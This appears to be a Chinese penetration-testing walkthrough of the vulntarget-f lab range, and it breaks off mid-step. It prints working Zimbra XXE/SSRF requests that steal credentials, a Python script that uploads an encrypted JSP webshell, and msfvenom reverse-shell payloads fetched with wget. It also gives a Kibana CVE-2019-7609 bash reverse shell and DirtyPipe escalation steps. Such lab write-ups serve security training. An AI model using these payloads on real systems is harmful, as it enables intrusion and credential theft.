<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5m_GIxPgXxuHLUbbWaC2Cw)

星期五实验室

**阅读须知**  

星期五实验室的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息造成的直接或间接后果和损失，均由使用者本人负责。

  

星期五实验室拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/EnGZNML8PgTBzuCFQUunZ4jfuP4an5hOIwb7xYClZUabXH79ibOp0XJoK4hMuMmZUrK11fYk2c8Axgbe5IJ1aQA/0?wx_fmt=png) ** 星期五实验室 ** 星期五实验室 47篇原创内容   公众号

 ![](http://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1A9eSovMjmg3vTs8uzRyicthuDpqskG1VEM5oAZ0VEFs822aickkgVrKyN4domWdEoxg7Z2OlkoWRVg/0?wx_fmt=png) ** 乌鸦安全 ** 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。 82篇原创内容   公众号

关于vulntarget-f 靶场：

[vulntarget漏洞靶场系列（六）— vulntarget-f](http://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647783556&idx=1&sn=fdac5fee734ed3fd014e27549d2f5a7b&chksm=f35fa378c4282a6e5dca907b85ea13731da4fd777aaf5bd67f0924e5b26bfea5eefcaf2ae2ee&scene=21#wechat_redirect)  

  

**01**

**外网主机**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/EnGZNML8PgQJJczqWDOrRkwvYHXN42GIJl7ELfR4YOTu0LOSn7FkvEzoZeadYhGnPrgMryBxHrgQgT6AYfLkew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

**信息搜集**

这里我桥接网络是在公司网络中，扫描到的主机比较多，所以跳过了这一步。

```
arp-scan -l -I eth0 |grep 10.30.1.88
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/EnGZNML8PgQJJczqWDOrRkwvYHXN42GIcjuhTvibNhLChPZJypKT7dku06SKKnZYuFE4GichrLLVcTKDd2XIkZfw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

来个服务探测+全端口扫描

```
nmap -sV -p- 10.30.1.88
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/EnGZNML8PgQJJczqWDOrRkwvYHXN42GI5y8Q3iaPNsrKp1icdqGbxk9Waib7JURSZDz4A2PRSnx79siah87RxXN5BA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

这里扫出来了zimbra，搜索这个服务的相关漏洞：CVE-2016-9924、CVE-2019-9670，都是xxe+ssrf来getshell。使用浏览器访问7071端口，需要加上https

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**zimbra xxe测试**

打开burp抓包，通过xxe来读取目标主机/etc/passwd文件测试是否存在漏洞，数据包如下：

```
`POST /Autodiscover/Autodiscover.xml HTTP/1.1``Host: 10.30.1.88:7071``User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0``Accept: */*``Accept-Language: en-US,en;q=0.5``Accept-Encoding: gzip, deflate``Content-Type: application/xml``Content-Length: 346``Origin: https://10.30.1.88:7071``Referer: https://10.30.1.88:7071/zimbraAdmin/``Sec-Fetch-Dest: empty``Sec-Fetch-Mode: cors``Sec-Fetch-Site: same-origin``Cache-Control: max-age=0``Te: trailers``Connection: close``<!DOCTYPE xxe [``<!ELEMENT name ANY >``<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>` `<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">` `<Request>` `<EMailAddress>aaaaa</EMailAddress>` `<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>` `</Request>` `</Autodiscover>`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

读取到了 /etc/passwd 文件代表了存在CVE-2019-9670 XXE漏洞。接着需要构造payload来读取zimbra的配文件localconfig.xml。

**xxe读取zimbra用户密码**

首先在攻击机上面编写一个test.dtd，内容为：  

```
`<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">``<!ENTITY % start "<![CDATA[">``<!ENTITY % end "]]>">``<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

接着使用python3开启一个http服务，让靶机来读取这个dtd文件

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

burp发送POST请求

/Autodiscover/Autodiscover.xml，数据包为：

```
`POST /Autodiscover/Autodiscover.xml HTTP/1.1``Host: 10.30.1.88:7071``User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0``Accept: */*``Accept-Language: en-US,en;q=0.5``Accept-Encoding: gzip, deflate``Content-Type: application/xml``Content-Length: 405``Origin: https://10.30.1.88:7071``Referer: https://10.30.1.88:7071/zimbraAdmin/``Sec-Fetch-Dest: empty``Sec-Fetch-Mode: cors``Sec-Fetch-Site: same-origin``Cache-Control: max-age=0``Te: trailers``Connection: close``<!DOCTYPE Autodiscover [` `<!ENTITY % dtd SYSTEM "http://10.30.7.81:8000/test.dtd">` `%dtd;` `%all;` `]>``<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">` `<Request>` `<EMailAddress>aaaaa</EMailAddress>` `<AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>` `</Request>``</Autodiscover>`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在返回的数据包中查找:ldap_amavis_password，下一行为密码：XbVaoX3Y

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**利用获取到的密码来获取一个低权限的token**

POST请求/service/admin/soap  
数据包为：  

```
`POST /service/admin/soap HTTP/1.1``Host: 10.30.1.88:7071``User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0``Accept: */*``Accept-Language: en-US,en;q=0.5``Accept-Encoding: gzip, deflate``Content-Type: application/xml``Content-Length: 463``Origin: https://10.30.1.88:7071``Referer: https://10.30.1.88:7071/zimbraAdmin/``Sec-Fetch-Dest: empty``Sec-Fetch-Mode: cors``Sec-Fetch-Site: same-origin``Cache-Control: max-age=0``Te: trailers``Connection: close``<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">` `<soap:Header>` `<context xmlns="urn:zimbra">` `<userAgent />` `</context>` `</soap:Header>` `<soap:Body>` `<AuthRequest xmlns="urn:zimbraAccount">` `<account by="adminName">zimbra</account>` `<password>XbVaoX3Y</password>` `</AuthRequest>` `</soap:Body>``</soap:Envelope>`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

将返回包的ZM_AUTH_TOKEN保存下来：

ZM_AUTH_TOKEN=0_1ec95dc99004e6a87cbdcda1d25506fa2ce0441e_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313634373736313437323130353b747970653d363a7a696d6272613b7469643d393a3339363531373339343b

  

**利用SSRF获取高权限token**

POST请求/service/admin/soap，请求包中添加刚刚获取的cookie，将请求body中的urn后面修改为zimbraAdmin，发送请求获取到admin的token：

```
`POST /service/admin/soap HTTP/1.1``Host: 10.40.0.71:7071``User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0``Accept: */*``Accept-Language: en-US,en;q=0.5``Accept-Encoding: gzip, deflate``Content-Type: application/soap+xml; charset=utf-8``Content-Length: 461``Origin: https://10.40.0.71:7071``Referer: https://10.40.0.71:7071/zimbraAdmin/``Sec-Fetch-Dest: empty``Sec-Fetch-Mode: cors``Sec-Fetch-Site: same-origin``Cache-Control: max-age=0``Te: trailers``Connection: close``Cookie:ZM_AUTH_TOKEN=0_1ec95dc99004e6a87cbdcda1d25506fa2ce0441e_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313634373736313437323130353b747970653d363a7a696d6272613b7469643d393a3339363531373339343b``<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">` `<soap:Header>` `<context xmlns="urn:zimbra">` `<userAgent />` `</context>` `</soap:Header>` `<soap:Body>` `<AuthRequest xmlns="urn:zimbraAdmin">` `<account by="adminName">zimbra</account>` `<password>XbVaoX3Y</password>` `</AuthRequest>` `</soap:Body>``</soap:Envelope>`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

返回包接收到admin的cookie：

ZM_ADMIN_AUTH_TOKEN=0_bf55f890369e1e121cae05a64d73696b0da4f275_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313634373633323435383338373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313433363536373035313b

  

**利用高权限token上传文件getshell**

exp：

```
`import requests``file= {``'filename1':(None,"whocare",None),``'clientFile':("shell.jsp",r'<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>',"text/plain"),` `'requestId':(None,"12",None),``}   #这里我上传的是一个冰蝎的马``headers ={` `"Cookie":"ZM_ADMIN_AUTH_TOKEN=0_bf55f890369e1e121cae05a64d73696b0da4f275_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313634373633323435383338373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313433363536373035313b",    #修改成上面获取到的的admin_token``"Host":"foo:7071"``}``r=requests.post("https://10.30.1.88:7071/service/extension/clientUploader/upload",files=file,headers=headers,verify=False)   #ip也需要修改` `print(r.text)`
```

  

运行脚本

```
python exp.py
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用冰蝎连接：

shell路径为：https://IP/downloads/shell.jsp

密码为:rebeyond，添加cookie请求头

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

命令执行后看到是一个低权限的shell

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**提权（失败）**

查看系统内核是否可以通过内核来提权。尝试了几个提权发现都没用，放弃内核提权。。。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查找SUID文件，好像也没找到可以用的啊。。。

```
find / -perm -u=s -type f 2>/dev/null
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在看一下计划任务，啥都没。。。

```
cat /etc/crontab
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

试一下CVE-2021-3156 sudo提权，也不行。。

```
sudoedit -s /
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

再看一下CVE-2021-4034 polkit提权，好吧还是不受影响的版本。。。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里我放弃提权了，如果有大佬成功提权的欢迎告诉我一下。。。

  

**不知道什么操作（flag权限，logindata权限，mv到/var/log）**

一番寻找后，在/tmp目录下找到一个奇怪的目录

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

该目录下有一个root目录，其中有一个文件：192.168.0.102.login_data

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在这里貌似找到了root用户的密码：vulntarget-f

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用ssh去连接

```
ssh root@10.30.1.88
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

成功登录。。

  

在root根目录下有个flag文件，查看一下，好像就是随便打的一串字符。。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看网络，发现还有一个内网地址。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

查看系统信息

```
`uname -a``cat /etc/redhat-release`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

  

**02**

**内网主机**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**msf上线**

上传一个msf马，让主机上线

```
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.30.7.81 LPORT=3333 -a x86 --platform Linux -f elf > shell.elf``python3 -m http.server`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

ssh连接的主机使用wget来下载  

```
`wget http://10.30.7.81:8000/shell.elf``chmod +x shell.elf`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

攻击机打开msf控制台，设置监听

```
`msfconsole``use exploit/multi/handler``set payload linux/x86/meterpreter/reverse_tcp``set lhost 10.30.7.81   #攻击机的IP``set lport 3333  #使用msfvenom生成的端口``run`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到ssh会话中后台执行elf文件

```
nohup ./shell.elf &
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

msf成功接收到session

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

上传一个fscan来扫描一下内网

```
upload /root/tools/scan/fscan_amd64
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**内网扫描**

回到ssh连接的会话中执行fscan，扫描192.168.20.0/24

```
`chmod +x fscan_amd64``./fscan_amd64 -h 192.168.20.0/24`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫到一个192.168.20.128主机，但是好像这里只扫到一个9200端口，换个参数扫全端口

```
./fscan_amd64 -h 192.168.20.128 -p 1-65535
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

扫到一个5601端口，看返回信息好像是个kibana

  

**msf内网代理（有点问题）**

回到msf的session，设置一个sock代理

```
`run post/multi/manage/autoroute  #添加内网的路由``bg``route print``use auxiliary/server/socks_proxy``run`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

使用firefox插件来代理流量

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问刚刚扫描到的来个端口：9200、5601

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里的5601端口一直加载不进去，可能是代理的问题，换一个frp试试看。

  

**frp内网代理**

使用msf上传一个frpc和frpc.ini

```
`session 1``upload /root/proxy/frpc``upload /root/proxy/frpc.ini`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到ssh会话中修改frpc配置文件

```
`vim frpc.ini``chmod +x frpc`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

攻击机后台运行frps

```
nohup ./frps -c frps.ini &
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

回到ssh会话中后台执行frpc  

```
nohup ./frpc -c frpc.ini &
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

firefox插件添加代理再次访问5601端口

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

搜索这个服务相关漏洞，最终找到一个：CVE-2019-7609。

  

**CVE-2019-7609 kibana代码执行**

在导航栏中点击Timelion，在文本框中输入反弹shell的poc然后点击右侧▶按钮。

```
.es().props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.20.130/8888 0>&1\'");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')    #其中exec括号后面的内容为代码执行
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在ssh会话中监听8888端口

```
nc -lvvp 8888
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

然后点击左侧导航栏的Canvas，成功接收到shell

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里是一个低权限的shell

  

**提权**

收集一下这台主机的信息

```
`ip a``uname -a``lsb_release -a`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

可以看到是双网卡，系统为ubuntu 20.04，内核版本为5.8.0-50。

  

当看到内核版本为5.8.0-50的时候，直接想到前两天刚刚爆出来的内核提权：CVE-2022-0847-DirtyPipe-Exploit，

exp：https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

  

这里我已经编译好了，通过msf来上传到外网主机中

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

然后在ssh会话中断开nc监听的shell，这里发现之前执行的反弹shell会一直接收到。所以后续不需要再次反弹shell了，只需要执行nc监听8888端口就可以了。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

找一下之前上传的jsp木马路径，然后把编译好的提权文件移过去。

```
`find /. -name shell.jsp``mv exp /opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbra/downloads`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

直接使用nc监听8888接受shell，wget下载提权文件

```
`nc -lvvp 8888``wget --no-check-certificate https://192.168.20.130:7071/downloads/exp`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

好吧，这里没权限，换到主目录看看

  

访问一下外网的地址，可以看到主目录是zimbraAdmin

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

将提权文件移到zimbraAdmin目录下

```
mv mv exp ../../zimbraAdmin/
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到nc监听的shell中下载

```
`nc -lvvp 8888``wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/exp``cd /tmp``chmod +x exp``./exp`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

但是发现这台机器压根没有gcc，无法运行提权文件。。。所以需要回到攻击机静态编译一下  
  
重新编译后，上传到外网主机中（因为得到了root账号密码，直接用scp传好了）。

```
`gcc -static exploit.c -o exp1``scp exp1 root@10.30.1.88:/opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbraAdmin`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到nc监听的端口中下载刚刚静态编译的exp1文件，赋权然后执行

```
`wget --no-check-certificate -P /tmp https://192.168.20.130:7071/zimbraAdmin/exp1``chmod +x exp1``./exp1`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里可以看到已经成功获取到root权限  
  
查找一下flag，看看有没有内网

```
`find /. -name flag``cat /root/flag``ip a`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

看到一个内网192.168.20.30.0/24网段，flag里面貌似是个提示：admin/top1000.txt。但是现在还不知道内网还有哪些主机和服务，这里上传一个fscan到外网主机中，然后再用这台内网主机来下载fscan扫描内网。

  

  

  

**03**

**二层内网**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**内网探测**

攻击机使用scp上传一个fscan到外网主机中，让内网主机来下载

```
scp fscan_amd64 root@10.30.1.88:/opt/zimbra/jetty-distribution-9.1.5.v20140505/webapps/zimbraAdmin
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

回到外网主机中使用nc监听到的shell来下载

```
